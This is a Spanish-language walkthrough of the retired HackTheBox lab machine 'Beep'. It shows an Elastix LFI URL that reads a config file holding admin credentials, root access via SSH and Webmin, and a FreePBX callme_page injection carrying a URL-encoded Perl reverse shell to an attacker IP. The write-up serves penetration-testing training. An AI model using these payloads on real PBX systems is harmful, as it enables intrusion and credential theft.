---
title: "Beep - HackTheBox"
description: "Writeup de Beep, una máquina Linux con múltiples vectores de ataque a través de Elastix."
pubDate: 2024-10-11
platform: "htb"
category: "machines"
difficulty: "easy"
os: "linux"
lang: es
tags: ["elastix", "lfi", "webmin", "privilege-escalation"]
retired: true
logo: "/images/writeups/htb/beep/logo.png"
heroImage: "/images/writeups/htb/beep/logo.png"
attackVectors: ["web", "network"]
techniques: ["T1190", "T1078", "T1068"]
certifications: ["OSCP", "eJPT", "CEH"]
skillLevel: "beginner"
estimatedTime: "1-2 horas"
points: 20
rating: 4
---

# Beep - HackTheBox Writeup

**Dificultad**: Easy  
**OS**: Linux  
**Plataforma**: HackTheBox

## Reconocimiento

```bash
nmap -sC -sV -p- 10.10.10.7
```

**Puertos interesantes:**
- 22/tcp (SSH)
- 80/tcp (HTTP - Apache)
- 443/tcp (HTTPS - Apache)
- 10000/tcp (Webmin)

## Enumeración Web

Al acceder a HTTPS encontramos **Elastix** - un sistema PBX basado en Asterisk.

### Elastix LFI

Elastix tiene una vulnerabilidad de Local File Inclusion (LFI):

```
https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
```

En el archivo `amportal.conf` encontramos credenciales:
- Usuario: `admin`
- Contraseña: `jEhdIekWmdjE`

## Explotación

### Método 1: SSH

Las credenciales funcionan para SSH como usuario root:

```bash
ssh root@10.10.10.7
Password: jEhdIekWmdjE
```

### Método 2: Webmin

También podemos usar las credenciales en Webmin (puerto 10000) y ejecutar comandos:

```bash
# En Webmin Command Shell
cat /root/root.txt
```

### Método 3: FreePBX Exploit

```bash
# Reverse shell a través de extension
https://10.10.10.7/recordings/misc/callme_page.php?action=c&callmenum=1337@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%2210.10.14.5%3a4444%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A
```

## Flags

**User flag:**
```bash
cat /home/fanis/user.txt
```

**Root flag:**
```bash
cat /root/root.txt
```

## Conclusión

Beep demuestra que una sola vulnerabilidad (LFI) puede comprometer todo el sistema cuando expone credenciales. Además, muestra la importancia de:

- Segregación de credenciales
- Principio de privilegio mínimo
- Actualización de software
- Configuración segura de archivos
